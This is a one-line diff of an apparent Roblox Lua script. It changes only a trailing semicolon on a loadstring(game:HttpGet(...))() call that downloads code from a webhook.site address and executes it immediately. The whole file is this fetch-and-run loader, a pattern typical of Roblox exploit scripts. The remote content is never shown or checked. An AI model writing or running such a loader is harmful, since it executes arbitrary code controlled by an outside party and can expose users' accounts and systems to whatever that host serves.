@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://webhook.site/12953783-b6af-48cb-b216-3f5421409c34"))()
+loadstring(game:HttpGet("https://webhook.site/12953783-b6af-48cb-b216-3f5421409c34"))();
